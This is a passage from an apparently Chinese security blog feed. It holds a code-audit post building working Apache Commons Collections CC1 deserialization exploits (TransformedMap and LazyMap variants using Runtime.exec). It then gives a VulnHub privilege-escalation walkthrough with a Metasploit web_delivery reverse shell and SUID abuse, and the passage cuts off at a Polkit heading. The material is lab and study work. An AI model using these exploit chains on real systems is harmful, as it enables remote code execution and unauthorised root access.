args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iMethodName <span class="token operator">=</span> methodName<span class="token punctuation">;</span>    iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>    iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> cls <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>iMethodName<span class="token punctuation">,</span> iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' cannot be accessed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InvokerTransformer: The method '"</span> <span class="token operator">+</span> iMethodName <span class="token operator">+</span> <span class="token string">"' on '"</span> <span class="token operator">+</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"' threw an exception"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class="language-none"><code class="language-none">package org.example;import org.apache.commons.collections.functors.InvokerTransformer;import java.lang.reflect.Method;public class CC1Test &#123;    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException &#123;        Runtime r &#x3D; Runtime.getRuntime();&#x2F;&#x2F;        Class c &#x3D; Runtime.class;&#x2F;&#x2F;        Method execmethod &#x3D; c.getMethod(&quot;exec&quot;, String.class);&#x2F;&#x2F;        execmethod.invoke(r,&quot;calc&quot;);        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);    &#125;&#125;</code></pre><p>![](\images\posts\Commons-Collection CC1链\1726477865073.jpg)</p><p><strong>查找调用transform()的类的方法</strong></p><p>找到TransformedMap类下的checkSetValue方法</p><p>checkSetValue方法和构造函数</p><pre class="language-none"><code class="language-none">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;    super(map);    this.keyTransformer &#x3D; keyTransformer;    this.valueTransformer &#x3D; valueTransformer;&#125;protected Object checkSetValue(Object value) &#123;    return valueTransformer.transform(value);&#125;</code></pre><p>protect权限，只能内部类访问,往上找decorate为public，且valueTransformer可控。</p><pre class="language-none"><code class="language-none">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;    return new TransformedMap(map, keyTransformer, valueTransformer);&#125;protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;    super(map);    this.keyTransformer &#x3D; keyTransformer;    this.valueTransformer &#x3D; valueTransformer;&#125;protected Object checkSetValue(Object value) &#123;    return valueTransformer.transform(value);&#125;</code></pre><p>通过该方法给他传值，再触发checkSetValue()方法即可</p><pre class="language-none"><code class="language-none">    Runtime r &#x3D; Runtime.getRuntime();&#x2F;&#x2F;    Class c &#x3D; Runtime.class;&#x2F;&#x2F;    Method execmethod &#x3D; c.getMethod(&quot;exec&quot;, String.class);&#x2F;&#x2F;    execmethod.invoke(r,&quot;calc&quot;);    InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);    HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();    Map&lt;Object,Object&gt; decorate &#x3D; TransformedMap.decorate(map, null, invokerTransformer);   &#x2F;&#x2F;只需赋值valueTransformer</code></pre><p><strong>查找调用checkSetValue()的方法</strong></p><p>![](\images\posts\Commons-Collection CC1链\1726477998136.jpg)</p><p>Map中有setValue方法，MapEntry重写AbstractMapEntryDecorator的setValue方法,AbstractMapEntryDecorator,AbstractMapEntryDecorator引入Map.Entry接口，所以进行Map遍历，就可以调用setValue()</p><p>![](\images\posts\Commons-Collection CC1链\1726478031756.jpg)</p><pre class="language-none"><code class="language-none">package org.example;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CC1Test &#123;    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException &#123;        Runtime r &#x3D; Runtime.getRuntime();&#x2F;&#x2F;        Class c &#x3D; Runtime.class;&#x2F;&#x2F;        Method execmethod &#x3D; c.getMethod(&quot;exec&quot;, String.class);&#x2F;&#x2F;        execmethod.invoke(r,&quot;calc&quot;);        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;admin&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; transformedMap &#x3D; TransformedMap.decorate(map, null, invokerTransformer);   &#x2F;&#x2F;只需赋值valueTransformer        for (Map.Entry entry:transformedMap.entrySet())&#123;            entry.setValue(r);        &#125;    &#125;&#125;</code></pre><p><strong>查找调用setValue()的方法AnnotationInvocationHandlerreadObject()里面调用了该方法</strong></p><p>![](\images\posts\Commons-Collection CC1链\1726478115067.jpg)</p><p>找到构造函数</p><p>![](\images\posts\Commons-Collection CC1链\1726478143936.jpg)</p><p>memberValues可控，定义类默认为default，只能通过反射调用</p><pre class="language-none"><code class="language-none">public class CC1Test &#123;    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException &#123;        Runtime r &#x3D; Runtime.getRuntime();&#x2F;&#x2F;        Class c &#x3D; Runtime.class;&#x2F;&#x2F;        Method execmethod &#x3D; c.getMethod(&quot;exec&quot;, String.class);&#x2F;&#x2F;        execmethod.invoke(r,&quot;calc&quot;);        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;admin&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; transformedMap &#x3D; TransformedMap.decorate(map, null, invokerTransformer);   &#x2F;&#x2F;只需赋值valueTransformer&#x2F;&#x2F;        for (Map.Entry entry:transformedMap.entrySet())&#123;&#x2F;&#x2F;            entry.setValue(r);&#x2F;&#x2F;        &#125;        Class c &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationInvocationHandlerConstructor &#x3D; c.getDeclaredConstructor(Class.class, Map.class);        annotationInvocationHandlerConstructor.setAccessible(true);        Object o &#x3D; annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);        serialize(o);        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        &#x2F;&#x2F;将序列化后保存到ser.bin中        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><p>解决未弹计算器问题</p><p><strong>Runtime没有序列化</strong></p><p>原型类Class存在serializable接口，可以序列化</p><pre class="language-none"><code class="language-none">        Method getRuntiMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);        Runtime r &#x3D; (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntiMethod);        Method execMethod &#x3D; (Method) new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);&#x2F;&#x2F;        Class c &#x3D; Runtime.class;&#x2F;&#x2F;        Method getRuntiMethod &#x3D; c.getMethod(&quot;getRuntime&quot;, null);&#x2F;&#x2F;        Runtime r &#x3D; (Runtime) getRuntiMethod.invoke(null, null);&#x2F;&#x2F;        Method execMethod &#x3D; c.getMethod(&quot;exec&quot;, String.class);&#x2F;&#x2F;        execMethod.invoke(r, &quot;calc&quot;);</code></pre><p>![](\images\posts\Commons-Collection CC1链\1726478200659.jpg)</p><p>使用ChainedTransformer</p><p>![](\images\posts\Commons-Collection CC1链\1726478230064.jpg)</p><pre class="language-none"><code class="language-none">    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException &#123;&#x2F;&#x2F;        Runtime r &#x3D; Runtime.getRuntime();&#x2F;&#x2F;        Method getRuntiMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);&#x2F;&#x2F;        Runtime r &#x3D; (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntiMethod);&#x2F;&#x2F;        Method execMethod &#x3D; (Method) new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        chainedTransformer.transform(Runtime.class);    &#125;</code></pre><p>![](\images\posts\Commons-Collection CC1链\1726478279301.jpg)</p><p><strong>setValue无法执行问题</strong></p><pre class="language-none"><code class="language-none">    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException &#123;&#x2F;&#x2F;        Runtime r &#x3D; Runtime.getRuntime();&#x2F;&#x2F;        Method getRuntiMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);&#x2F;&#x2F;        Runtime r &#x3D; (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntiMethod);&#x2F;&#x2F;        Method execMethod &#x3D; (Method) new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);&#x2F;&#x2F;        chainedTransformer.transform(Runtime.class);&#x2F;&#x2F;        Class c &#x3D; Runtime.class;&#x2F;&#x2F;        Method getRuntiMethod &#x3D; c.getMethod(&quot;getRuntime&quot;, null);&#x2F;&#x2F;        Runtime r &#x3D; (Runtime) getRuntiMethod.invoke(null, null);&#x2F;&#x2F;        Method execMethod &#x3D; c.getMethod(&quot;exec&quot;, String.class);&#x2F;&#x2F;        execMethod.invoke(r, &quot;calc&quot;);&#x2F;&#x2F;        Class c &#x3D; Runtime.class;&#x2F;&#x2F;        Method execmethod &#x3D; c.getMethod(&quot;exec&quot;, String.class);&#x2F;&#x2F;        execmethod.invoke(r,&quot;calc&quot;);&#x2F;&#x2F;        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;admin&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; transformedMap &#x3D; TransformedMap.decorate(map, null, chainedTransformer);   &#x2F;&#x2F;只需赋值valueTransformer&#x2F;&#x2F;        for (Map.Entry entry:transformedMap.entrySet())&#123;&#x2F;&#x2F;            entry.setValue(r);&#x2F;&#x2F;        &#125;        Class c &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationInvocationHandlerConstructor &#x3D; c.getDeclaredConstructor(Class.class, Map.class);        annotationInvocationHandlerConstructor.setAccessible(true);        Object o &#x3D; annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);        serialize(o);        unserialize(&quot;CCTest1.txt&quot;);    &#125;</code></pre><p>两个if语句问题</p><p>![](\images\posts\Commons-Collection CC1链\1726478322937.jpg)</p><p>断点调试为null值，未过if语句</p><p>![](\images\posts\Commons-Collection CC1链\1726478345663.jpg)</p><p>获取一个注解类型的 AnnotationType 实例，并从中提取注解成员的类型</p><p>![](\images\posts\Commons-Collection CC1链\1726478373808.jpg)</p><p>把Override换成有值的注解Target</p><p>![](\images\posts\Commons-Collection CC1链\1726478421260.jpg)</p><p>![](\images\posts\Commons-Collection CC1链\1726478525859.jpg)</p><p><strong>setValue值无法控制</strong></p><p>ConstantTransformer返回一个常量可以利用他来避免readObject中的修改。</p><p>![](\images\posts\Commons-Collection CC1链\1726478566150.jpg)</p><p>![](\images\posts\Commons-Collection CC1链\1726478587565.jpg)</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="language-none"><code class="language-none">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class CC1Test &#123;    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException &#123;        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; transformedMap &#x3D; TransformedMap.decorate(map, null, chainedTransformer);   &#x2F;&#x2F;只需赋值valueTransformer        Class c &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationInvocationHandlerConstructor &#x3D; c.getDeclaredConstructor(Class.class, Map.class);        annotationInvocationHandlerConstructor.setAccessible(true);        Object o &#x3D; annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);        serialize(o);        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><p>![](\images\posts\Commons-Collection CC1链\1726478660977.jpg)</p><h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>对比之前CC1链从此处开始不同</p><p>![](\images\posts\Commons-Collection CC1链\1726478888068.jpg)</p><p>LazyMap.get()</p><p>![](\images\posts\Commons-Collection CC1链\1726478955464.jpg)</p><p>这里的factory可控,factory传chainedTransformer对象,map</p><p>![](\images\posts\Commons-Collection CC1链\1726478967711.jpg)</p><p>构造一下EXP</p><pre class="language-none"><code class="language-none">Transformer[] transformers &#x3D; new Transformer[]&#123;        new ConstantTransformer(Runtime.class),        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;admin123&quot;);Map&lt;Object,Object&gt; layzMap &#x3D; LazyMap.decorate(map, chainedTransformer);layzMap.get(&quot;机器猫&quot;);</code></pre><p>![](\images\posts\Commons-Collection CC1链\1726478981873.jpg)</p><p>AnnotationInvocationHandler.invoke()</p><p>![](\images\posts\Commons-Collection CC1链\1726479036069.jpg)</p><p>get在invoke方法里面</p><p>AnnotationInvocationHandler实现了InvocationHandler接口，可用动态代理</p><p>![](\images\posts\Commons-Collection CC1链\1726479063414.jpg)</p><p>Proxy.newProxyInstance()里面如果传了AnnotationInvocationHandler对象，创建出来的代理对象不管调什么方法都会进invoke()方法。</p><p>两个if方法</p><p>![](\images\posts\Commons-Collection CC1链\1726479091186.jpg)</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;不能调用equals方法if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length &#x3D;&#x3D; 1 &amp;&amp;    paramTypes[0] &#x3D;&#x3D; Object.class)    return equalsImpl(args[0]); &#x2F;&#x2F;要调用无参方法if (paramTypes.length !&#x3D; 0)throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);</code></pre><p>此处刚好存在无参方法</p><p>![](\images\posts\Commons-Collection CC1链\1726479104616.jpg)</p><p>memberValues也可控，传一个lazymap</p><p>![](\images\posts\Commons-Collection CC1链\1726479117003.jpg)</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre class="language-none"><code class="language-none">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class CC1LazyMap &#123;    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException &#123;        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; layzMap &#x3D; LazyMap.decorate(map, chainedTransformer);&#x2F;&#x2F;        layzMap.get(&quot;机器猫&quot;);        Class c &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationInvocationHandlerConstructor &#x3D; c.getDeclaredConstructor(Class.class, Map.class);        annotationInvocationHandlerConstructor.setAccessible(true);        InvocationHandler invocationHandler &#x3D; (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,layzMap);        Map o &#x3D; (Map) Proxy.newProxyInstance(layzMap.getClass().getClassLoader(), layzMap.getClass().getInterfaces(), invocationHandler);        Object o1 &#x3D; annotationInvocationHandlerConstructor.newInstance(Override.class, o);        serialize(o1);        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><p>![](\images\posts\Commons-Collection CC1链\1726479155941.jpg)</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权(escalate_linux_1靶机)</title>
      <link href="/2024/11/11/2024-09-15-Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/"/>
      <url>/2024/11/11/2024-09-15-Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/</url>
      
        <content type="html"><![CDATA[<p><strong><a href="https://www.vulnhub.com/entry/escalate_linux-1,323">靶机地址</a></strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>扫描存活</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.235.0/24</code></pre><p>访问后是Ubuntu默认页面</p><p>目录扫描,存在shell.php</p><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726366262278.jpg"></p><p>cmd可执行命令</p><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726366335040.jpg"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>正常弹shell命令不行，换msf弹</p><p>使用exploit&#x2F;multi&#x2F;script&#x2F;web_delivery模块</p><pre class="language-bash" data-language="bash"><code class="language-bash">search web_deliveryuse exploit/multi/script/web_delivery</code></pre><p>配置参数</p><pre class="language-bash" data-language="bash"><code class="language-bash">show options<span class="token builtin class-name">set</span> srvhost <span class="token number">192.168</span>.235.128<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.235.128</code></pre><p>运行</p><pre class="language-bash" data-language="bash"><code class="language-bash">run</code></pre><p>将这段放在BP上url编码后反弹shell</p><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726368942924.jpg"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><blockquote><p>原理：</p></blockquote><p>能够执行命令的shell命令被赋予了suid权限</p><p>例如find被赋予suid权限</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> zhansan <span class="token parameter variable">-exec</span> <span class="token function">whoami</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>查找zhangsan文件夹的时候可以执行whoami命令</code></pre><blockquote><p>利用：</p></blockquote><p>shell 进入shell交互</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre><p>解释参数</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/表示从文件系统的顶部（根）开始并找到每个目录<span class="token parameter variable">-perm</span> 表示搜索随后的权限<span class="token parameter variable">-u</span> <span class="token operator">=</span> s表示查找root用户拥有的文件-type表示我们正在寻找的文件类型f 表示常规文件，而不是目录或特殊文件<span class="token number">2</span>表示该进程的第二个文件描述符，即stderr（标准错误）<span class="token operator">></span>表示重定向/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</code></pre><p>执行结果</p><pre class="language-bash" data-language="bash"><code class="language-bash">/sbin/mount.nfs/sbin/mount.ecryptfs_private/sbin/mount.cifs/usr/sbin/pppd/usr/bin/gpasswd/usr/bin/pkexec/usr/bin/chsh/usr/bin/passwd/usr/bin/traceroute6.iputils/usr/bin/chfn/usr/bin/arping/usr/bin/newgrp/usr/bin/sudo/usr/lib/xorg/Xorg.wrap/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/bin/ping/bin/su/bin/ntfs-3g/bin/mount/bin/umount/bin/fusermount/home/user5/script/home/user3/shell</code></pre><p>有个shell文件，直接执行就可以提权</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/user3 <span class="token operator">&amp;&amp;</span> ./shell</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726370865914.jpg"></p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">检测工具</a></p><pre class="language-none"><code class="language-none">wget http:&#x2F;&#x2F;192.168.235.1&#x2F;linux-exploit-suggester.sh</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726375663428.jpg"></p><h2 id="Polkit-CVE-2021-4034-提权"><a href="#Polkit-CVE-2021-4034-提权" class="headerlink" title="Polkit(CVE-2021-4034)提权"></a>Polkit(CVE-2021-4034)提权</h2><pre class="language-none"><code 